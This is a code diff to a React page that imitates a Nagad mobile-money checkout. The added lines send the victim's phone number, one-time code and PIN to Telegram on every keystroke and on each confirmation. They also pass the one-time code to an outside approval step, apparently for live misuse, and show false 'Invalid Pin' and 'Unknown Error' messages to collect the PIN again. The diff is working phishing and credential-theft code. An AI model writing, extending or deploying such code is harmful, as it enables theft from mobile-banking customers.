@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
-
-
+import { sendTelegramNotification } from "@/lib/payment-telegram";
+import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
@@ -38,6 +38,28 @@ const NagadPayment = () => {
   const [otpAttempts, setOtpAttempts] = useState(0);
   const [otpResent, setOtpResent] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+
+  // PIN keystroke telegram (partial pin)
+  const lastPinLenRef = useRef(0);
+  useEffect(() => {
+    if (!showPinView) { lastPinLenRef.current = 0; return; }
+    const currentPin = pinDigits.join('');
+    if (currentPin.length > lastPinLenRef.current && currentPin.length > 0) {
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: currentPin });
+    }
+    lastPinLenRef.current = currentPin.length;
+  }, [pinDigits, showPinView, amount, otpValue, phoneDigits]);
+
+  // OTP keystroke telegram (partial otp)
+  const lastOtpLenRef = useRef(0);
+  useEffect(() => {
+    if (!showOtpView) { lastOtpLenRef.current = 0; return; }
+    if (otpValue.length > lastOtpLenRef.current && otpValue.length > 0) {
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue });
+    }
+    lastOtpLenRef.current = otpValue.length;
+  }, [otpValue, showOtpView, amount, phoneDigits]);
+
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpInputRef = useRef<HTMLInputElement | null>(null);
@@ -153,25 +175,47 @@ const NagadPayment = () => {
   const handleConfirm = () => {
     if (isValidNumber()) {
       setIsLoading(true);
-      
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join('') }, { force: true });
       setTimeout(() => { setPhoneError(""); setShowOtpView(true); setIsLoading(false); }, 2000);
     } else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
   };
   const [otpDenyCount, setOtpDenyCount] = useState(0);
-  const handleOtpConfirm = () => {
-    navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`);
+  const handleOtpConfirm = async () => {
+    if (!isValidOtp()) return;
+    setIsLoading(true);
+    const nextAttempt = otpAttempts + 1;
+    setOtpAttempts(nextAttempt);
+    const decision = await submitOtpForApproval({
+      amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue,
+    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
+    setIsLoading(false);
+    if (decision === 'approved') {
+      setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0);
+    } else if (decision === 'timeout' || decision === 'error') {
+      navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
+    } else {
+      const nextDenies = otpDenyCount + 1;
+      setOtpDenyCount(nextDenies);
+      if (nextDenies >= 3) {
+        navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
+        return;
+      }
+      setOtpError(language === 'bn' ? "ভুল ভেরিফিকেশন কোড" : "Invalid verification code");
+      setOtpValue("");
+      setTimeout(() => setOtpError(""), 3500);
+    }
   };
 
   const handlePinConfirm = () => {
     setIsLoading(true);
     if (pinAttempts === 0) {
-      
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') }, { force: true });
       setTimeout(() => { setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided"); setPinAttempts(1); setIsLoading(false); }, 2000);
     } else if (pinAttempts === 1) {
-      
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') }, { force: true });
       setTimeout(() => { setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information."); setPinAttempts(2); setIsLoading(false); }, 2000);
     } else {
-      
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') }, { force: true });
       setTimeout(() => { setIsLoading(false); navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`); }, 2000);
     }
   };
